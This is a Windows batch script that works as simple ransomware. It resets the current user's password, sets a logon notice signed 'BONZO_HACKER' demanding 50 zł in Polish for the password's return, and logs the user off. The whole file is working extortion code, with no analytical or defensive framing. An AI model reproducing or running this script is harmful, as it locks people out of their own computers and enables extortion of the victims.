@echo OFF
net user %username% admin11
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_SZ /v legalnoticecaption /d BONZO_HACKER /f
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_SZ /v legalnoticetext /d MASZ_UTWORZONE_HASLO_NA_MONITOR_ZAPLAC_50GR_A_OTRZYMASZ_SWOJE_HASLO /f
shutdown -L
